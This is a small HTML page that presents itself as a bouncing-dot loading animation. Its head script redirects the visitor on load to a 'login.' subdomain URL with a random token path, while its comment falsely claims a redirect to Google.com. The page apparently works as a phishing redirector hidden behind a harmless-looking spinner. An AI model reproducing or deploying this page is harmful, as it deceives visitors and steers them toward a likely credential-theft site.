<!DOCTYPE html>
<html>
<head>
  <title>Loading Icon</title>
  <style>
    .loading {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .loading-dot {
      width: 20px;
      height: 20px;
      background-color: #000;
      border-radius: 50%;
      margin: 0 5px;
      animation: bounce 1s infinite ease-in-out;
    }

    @keyframes bounce {
      0%, 80%, 100% {
        transform: scale(0);
      }
      40% {
        transform: scale(1);
      }
    }
  </style>
  <script>
    // Redirect to Google.com
    window.location.href = 'https://login.vrilou.com/jbzVnEHR';
  </script>
</head>
<body>
  <div class="loading">
    <div class="loading-dot"></div>
    <div class="loading-dot"></div>
    <div class="loading-dot"></div>
  </div>
</body>
</html>
